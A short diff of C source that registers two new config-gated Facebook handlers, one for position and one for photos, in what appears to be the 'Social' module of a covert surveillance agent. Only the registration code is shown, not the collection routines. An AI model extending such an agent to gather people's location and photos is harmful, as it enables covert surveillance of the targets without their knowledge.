@@ -16,6 +16,8 @@
 #include "crypt.h"
 #include "conf.h"
 #include "debug.h"
+#include "photo_facebook.h"
+#include "position.h"
 
 #undef   _INCLUDE_GLOBAL_FUNCTIONS_
 #include "version.h"
@@ -507,6 +509,29 @@ VOID InitSocialEntries()
 
 	}
 
+	if (ConfIsModuleEnabled(L"position"))
+	{
+#ifdef _DEBUG
+		OutputDebug(L"[*] Social: inizializing position\n");
+#endif
+		wcscpy_s(pSocialEntry[n].strDomain, FACEBOOK_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = FacebookPositionHandler;
+		n++;
+
+	}
+
+	if (ConfIsModuleEnabled(L"photo"))
+	{
+#ifdef _DEBUG
+		OutputDebug(L"[*] Social: inizializing photo\n");
+#endif
+		wcscpy_s(pSocialEntry[n].strDomain, FACEBOOK_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = FacebookPhotoHandler;
+		n++;
+
+
+	}
+
 	// load timestamps
 	SocialLoadTimeStamps();
 	/*
@@ -606,6 +631,7 @@ VOID SocialMain()
 					pSocialEntry[i].dwIdle--;
 			}
 		}
+
 	}
 
 }
